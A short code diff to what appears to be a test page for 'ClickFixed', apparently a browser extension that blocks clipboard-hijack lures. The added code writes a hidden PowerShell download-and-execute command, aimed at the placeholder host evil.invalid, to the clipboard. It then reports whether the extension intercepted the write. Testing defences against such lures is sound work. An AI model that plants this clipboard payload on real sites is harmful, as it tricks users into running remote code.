@@ -122,7 +122,14 @@ function triggerProactiveModalLure() {
     modal.remove();
   });
   modal.querySelector("#lure-copy-btn").addEventListener("click", () => {
-    alert("Verification command copied!");
+    const payload = "powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.invalid/verify.ps1')";
+    navigator.clipboard.writeText(payload)
+      .then(() => {
+        alert("Verification command copied! (ClickFixed did NOT block this — check extension status)");
+      })
+      .catch(() => {
+        alert("Blocked: ClickFixed intercepted the clipboard write.");
+      });
   });
 }
 
